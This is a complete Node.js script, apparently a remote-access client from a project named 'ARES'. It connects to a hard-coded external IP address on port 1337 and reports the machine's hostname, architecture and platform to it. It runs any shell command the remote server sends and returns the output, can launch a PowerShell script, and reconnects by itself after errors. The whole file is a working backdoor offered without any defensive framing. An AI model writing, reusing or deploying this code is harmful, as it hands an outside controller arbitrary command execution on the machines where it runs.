var net = require('net');
const os = require('os');
var port = 1337;
var host = '104.237.111.55'
var hostname = os.hostname();
var arch = os.arch();
var platform = os.platform();
var spawn = require("child_process").spawn,child;

//
// Client
//

function openSocket() {
    var socket = net.connect(port, host);
    socket.setKeepAlive(true);
    socket.on('connect', onConnect.bind({}, socket));
    socket.on('error', onError.bind({}, socket));
    socket.on('data', onData.bind({}, socket));
}

var interval;
function onConnect(socket) {
    //console.log(socket)
    console.log('Socket is open!');
    console.log("hostname = "+  hostname)
    //this is a rudimentary custom event system keep the , inside the ''s :)
    socket.write('setinfo,' + hostname+','+ arch + ',' + platform)

 

}

function onData(socket, data){
    var data = Buffer.from(data).toString();
    var arg = data.split(',');
    var event = arg[0];
    console.log(event);

    if(event == 'ps'){
        child = spawn("powershell.exe",["F:\\PROJECTS\\ARES\\test.ps1"]);
        console.log('powershell')
        child.stdout.on("data",function(data){
            console.log("Powershell Data: " + data);
        });
        child.stderr.on("data",function(data){
            console.log("Powershell Errors: " + data);
        });
        child.on("exit",function(){
            console.log("Powershell Script finished");
        });
        child.stdin.end(); //end input
    }
    if (event == 'cmd'){

        //we gon do cool shit here with commands so be ready fam ;)

        const { exec } = require('child_process');
        exec(arg[1], (error, stdout, stderr) => {
          if (error) {

            socket.write('stdout,' + arg[2] +','+ error)
            return;
          }
          console.log(arg[2])
          socket.write('stdout,' + arg[2] +','+ stdout)

        });
    }

}

function onError(socket) {

    console.log('Socket error!');


    // Kill socket
    clearInterval(interval);
    socket.destroy();
    socket.unref();

    // Re-open socket
    setTimeout(openSocket);
}

openSocket();